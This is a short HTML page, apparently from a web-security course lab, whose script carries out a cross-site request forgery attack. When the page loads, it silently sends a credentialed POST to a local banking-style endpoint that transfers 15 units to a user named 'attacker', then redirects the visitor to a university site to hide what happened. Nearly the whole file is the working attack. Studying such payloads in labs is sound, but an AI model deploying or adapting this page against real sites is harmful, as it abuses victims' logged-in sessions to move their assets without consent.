<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
</head>

<body>
  <script>
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.withCredentials = true;
    xmlHttp.onload = () => {
      window.location = ' https://cs.ustc.edu.cn/';
    }
    const url = encodeURI(`http://localhost:3000/post_transfer`);
    xmlHttp.open("post", url); 
    xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xmlHttp.send('destination_username=attacker&quantity=15');
  </script>
</body>

</html>
